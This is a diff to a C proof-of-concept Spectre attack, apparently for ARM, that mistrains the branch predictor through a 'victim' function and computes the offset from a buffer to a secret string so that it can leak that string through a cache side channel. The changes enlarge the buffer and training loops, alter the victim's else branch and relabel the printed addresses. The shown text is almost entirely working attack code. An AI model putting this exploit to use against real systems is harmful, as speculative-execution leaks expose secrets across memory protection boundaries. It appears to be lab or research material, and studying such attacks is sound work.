@@ -7,7 +7,7 @@
 
 volatile uint64_t counter = 0;
 unsigned int buffer_size = 10;
-u_int8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+u_int8_t buffer[100] = {0,1,2,3,4,5,6,7,8,9};
 u_int8_t temp = 0;
 char*secret = "Some Secret Value";
 u_int8_t array[256*4096];
@@ -55,7 +55,7 @@ int victim(size_t x){
     //array[buffer[x]*4096 + DELTA] = 10;
     return buffer[x];
   } else {
-    return buffer[x]; 
+    return 0; 
   }
 }
 
@@ -77,7 +77,7 @@ void spectre(size_t offset){
   int i;
   u_int8_t s;
   //Mistraining the branch predictor using valid values for x
-  for(int i=0; i<10; i++){
+  for(int i = 0; i < 100; i++){
     victim(i);
   }
 
@@ -94,9 +94,9 @@ void spectre(size_t offset){
 
 int main(int argc, const char**argv){
   thresh = atoi(argv[1]);
-  printf("%p\n",(void*)&secret);
-  printf("%p\n",(void*)&buffer);
-  printf("%p\n",(void*)&array);
+  printf("Secet String Addr:   %p\n",(void*)&secret);
+  printf("Victim Buffer Addr:  %p\n",(void*)&buffer);
+  printf("Spectre Array Addr:  %p\n",(void*)&array);
   pthread_t inc_counter_thread;
 	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
 		fprintf(stderr, "Error creating thread\n");
@@ -105,11 +105,14 @@ int main(int argc, const char**argv){
 	while (counter < 10000000);
 	asm volatile ("DSB SY");
 
-
+  // initialize buffer 
+  for(int i = 0; i < 100; i++){
+    buffer[i] = i;
+  }
   size_t larger_x = (size_t)(secret - (char*)buffer);
   u_int8_t s;
   //Mistraining the branch predictor using valid values for x
-  for(int i=0; i<10; i++){
+  for(int i = 0; i < 100; i++){
     victim(i);
   }
 
